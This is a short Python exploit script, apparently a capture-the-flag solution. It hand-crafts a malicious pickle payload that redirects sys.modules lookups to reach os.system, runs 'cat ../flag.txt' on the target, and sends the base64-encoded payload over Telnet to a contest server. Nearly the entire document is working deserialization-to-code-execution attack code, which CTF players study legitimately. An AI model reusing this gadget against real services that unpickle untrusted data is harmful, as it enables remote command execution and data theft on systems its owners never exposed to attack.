import struct
import codecs
from telnetlib import Telnet


p  = b''
p += b'\x80\x02'                # protocol: 2

p += b'csys\nmodules\n'         # from sys import modules
p += b'q\x00'                   # memo[0] = sys.modules
p += b'X\x03\x00\x00\x00sys'    # push 'sys'
p += b'q\x01'                   # memo[1] = 'sys'

p += b'h\x00h\x01h\x00s'        # sys.modules['sys'] = sys.modules

p += b'csys\nget\n'             # sys.modules.get
p += b'X\x02\x00\x00\x00os\x85' # push ('os',)
p += b'R'                       # push sys.modules.get('os')
p += b'q\x02'                   # memo[2] = os

p += b'h\x00h\x01h\x02s'        # sys.modules['sys'] = os
p += b'csys\nsystem\n'          # push os.system

payload = b'cat ../flag.txt'

p += b'X'
p += struct.pack('<I', len(payload))
p += payload
p += b'\x85' # push ('ls',)

p += b'R' # RCE!!!!!!!
p += b'.'

p = codecs.encode(p, 'base64')
p = p.replace(b'\n', b'')


# r = Telnet('localhost', 5421)
# r = Telnet('18.232.184.48', 5421)
r = Telnet('pysh1.balsnctf.com', 5421)
r.write(p + b'\n')
r.interact()
